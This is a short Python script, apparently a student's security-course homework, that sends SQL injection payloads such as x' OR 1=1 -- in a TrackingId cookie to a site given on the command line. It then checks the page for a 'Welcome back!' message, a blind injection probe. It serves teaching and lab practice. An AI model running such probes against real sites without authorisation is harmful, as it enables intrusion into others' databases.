# Maksim Semchuk
# CS 495 Homework #2


import requests, sys
from bs4 import BeautifulSoup
import urllib.parse

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'

def try_query(query):
    print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False

print(try_query("""x' OR 1=1 --"""))
print(try_query("""x" OR 1=1 --"""))